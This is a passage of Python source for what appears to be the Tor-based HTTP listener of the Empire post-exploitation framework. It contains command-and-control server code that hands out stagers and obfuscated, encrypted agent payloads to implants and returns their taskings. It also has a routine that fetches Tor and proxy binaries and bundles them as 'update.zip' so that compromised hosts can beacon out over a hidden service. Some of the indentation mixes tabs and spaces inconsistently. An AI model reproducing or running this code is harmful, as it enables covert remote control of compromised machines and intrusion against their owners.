                                routingPacket = base64.b64decode(base64RoutingPacket)
                except Exception as e:
                    routingPacket = None
                    pass

            if routingPacket:
                # parse the routing packet and process the results
                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, clientIP)
                if dataResults and len(dataResults) > 0:
                    for (language, results) in dataResults:
                        if results:
                            if results == 'STAGE0':
                                # handle_agent_data() signals that the listener should return the stager.ps1 code

                                # step 2 of negotiation -> return stager.ps1 (stage 1)
                                dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http')
                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                                return make_response(stage, 200)

                            elif results.startswith('ERROR:'):
                                dispatcher.send("[!] Error from agents.handle_agent_data() for %s from %s: %s" % (request_uri, clientIP, results), sender='listeners/http')

                                if 'not in cache' in results:
                                    # signal the client to restage
                                    print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
                                    return make_response(self.default_response(), 401)
                                else:
                                    return make_response(self.default_response(), 200)

                            else:
                                # actual taskings
                                dispatcher.send("[*] Agent from %s retrieved taskings" % (clientIP), sender='listeners/http')
                                return make_response(results, 200)
                        else:
                            # dispatcher.send("[!] Results are None...", sender='listeners/http')
                            return make_response(self.default_response(), 200)
                else:
                    return make_response(self.default_response(), 200)

            else:
                dispatcher.send("[!] %s requested by %s with no routing packet." % (request_uri, clientIP), sender='listeners/http')
                return make_response(self.default_response(), 200)


        @app.route('/<path:request_uri>', methods=['POST'])
        def handle_post(request_uri):
            """
            Handle an agent POST request.
            """

            stagingKey = listenerOptions['StagingKey']['Value']
            clientIP = request.remote_addr

            requestData = request.get_data()
            dispatcher.send("[*] POST request data length from %s : %s" % (clientIP, len(requestData)), sender='listeners/http')

            # the routing packet should be at the front of the binary request.data
            #   NOTE: this can also go into a cookie/etc.
            dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
            if dataResults and len(dataResults) > 0:
                for (language, results) in dataResults:
                    if results:
                        if results.startswith('STAGE2'):
                            # TODO: document the exact results structure returned
                            if ':' in clientIP:
                                clientIP = '[' + str(clientIP) + ']'
                            sessionID = results.split(' ')[1].strip()
                            sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
                            dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/http')

                            hopListenerName = request.headers.get('Hop-Name')
                            try:
                                hopListener = helpers.get_listener_options(hopListenerName)
                                tempListenerOptions = copy.deepcopy(listenerOptions)
                                tempListenerOptions['Host']['Value'] = hopListener['Host']['Value']
                            except TypeError:
                                tempListenerOptions = listenerOptions

                            # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                            agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                            encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                            # TODO: wrap ^ in a routing packet?

                            return make_response(encryptedAgent, 200)

                        elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
                            dispatcher.send("[!] Error returned for results by %s : %s" %(clientIP, results), sender='listeners/http')
                            return make_response(self.default_response(), 200)
                        elif results == 'VALID':
                            dispatcher.send("[*] Valid results return by %s" % (clientIP), sender='listeners/http')
                            return make_response(self.default_response(), 200)
                        else:
                            return make_response(results, 200)
                    else:
                        return make_response(self.default_response(), 200)
            else:
                return make_response(self.default_response(), 200)

        try:
            certPath = listenerOptions['CertPath']['Value']
            host = listenerOptions['Host']['Value']
            if certPath.strip() != '' and host.startswith('https'):
                certPath = os.path.abspath(certPath)
                context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)

        except Exception as e:
            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
            dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/http')


    def generate_tor_zip(self):

		if os.path.isfile("data/update.zip"):
			os.remove("data/update.zip")

        	zf = zipfile.ZipFile("data/update.zip", "w", zipfile.ZIP_DEFLATED)
                #Fetch Tor Files
                tor_url = "https://dist.torproject.org/torbrowser/7.0.5/tor-win32-0.3.0.10.zip"
                priv_url = "https://www.irif.fr/~jch/software/files/polipo/polipo-20140107-win32.zip"
		if not os.path.isdir("data/tor_Temp"):
			os.makedirs("data/tor_Temp")

                print helpers.color("[*] Downloading TOR binaries")
                r = requests.get(tor_url, stream=True)
		with open("data/tor.zip","wb") as outfile:
			outfile.write(r.content)
			outfile.close()
                print helpers.color("[*] Unpacking TOR binaries")
		with zipfile.ZipFile("data/tor.zip") as zip_file:
    			for member in zip_file.namelist():
			        filename = os.path.basename(member)
	        		if not filename:
	            			continue
				if any(x in filename for x in ['tor.exe','.dll']):
		        		source = zip_file.open(member)
		        		target = open(os.path.join("data/tor_Temp", filename), "wb")
	        			with source, target:
	            				shutil.copyfileobj(source, target)
						target.close()
                print helpers.color("[*] Downling Proxy binaries")
                r = requests.get(priv_url, stream=True)
                with open("data/polipo.zip","wb") as outfile:
                        outfile.write(r.content)
                        outfile.close()
		print helpers.color("[*] Unpacking Proxy binaries")
               	with zipfile.ZipFile("data/polipo.zip") as zip_file:
			for member in zip_file.namelist():
                		filename = os.path.basename(member)
                               	if not filename:
                                	continue
                               	if any(x in filename for x in ['polipo.exe']):
                                	source = zip_file.open(member)
                                	target = open(os.path.join("data/tor_Temp", filename), "wb")
                                       	with source, target:
                                        	shutil.copyfileobj(source, target)
						target.close()
		#Set HidServAuth in torrc
		if self.options['HidServAuth']['Value'] != 'hash.onion AUTHCOOKIE':
			with open('data/tor_Temp/torrc',"w") as torrc:
				torrc.write("HidServAuth "+ self.options['HidServAuth']['Value'])
		print helpers.color("[*] Enabled HiddenServiceAuthentication")

#PRIVOXY CONFIG EDIT
#		with open('data/tor_Temp/config.txt',"r") as conffile:
#			tempconf = open('data/tor_Temp/tmp_config.txt',"wb")
#			for line in conffile:
#				if line.startswith("#        forward-socks5t"):
#					tempconf.write(line[2:])
#				elif line.startswith("actionsfile"):
#					continue
#				elif line.startswith("filterfile"):
#					continue
#				else:
#					tempconf.write(line)
#			tempconf.close()
#			conffile.close()
#			os.rename("data/tor_Temp/tmp_config.txt","data/tor_Temp/config.txt")

		print helpers.color("[*] Creating zipfile with Tor+Proxy")
                for folder, subfolders, files in os.walk('data/tor_Temp'):
                        for file in files:
                                zf.write(os.path.join("data/tor_Temp", file), file)
                zf.close()
                print helpers.color("[+] Zipfile stored in data/update.zip")
                print helpers.color("[*] Cleaning up temp files")
		shutil.rmtree(os.path.join("data/tor_Temp"))
		os.remove(os.path.join("data/tor.zip"))
                os.remove(os.path.join("data/polipo.zip"))
		print helpers.color("[+] TOR+Proxy ZIP Generation successfull")

    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options

	if os.path.isfile("data/update.zip"):
		print helpers.color("[+] TOR data/update.zip exists. Delete file to build a newer version.")
	else:
		self.generate_tor_zip()
		print helpers.color("[+] Upload data/update.zip to '%s'" % (listenerOptions['TORPackURI']['Value']))
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()


    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()
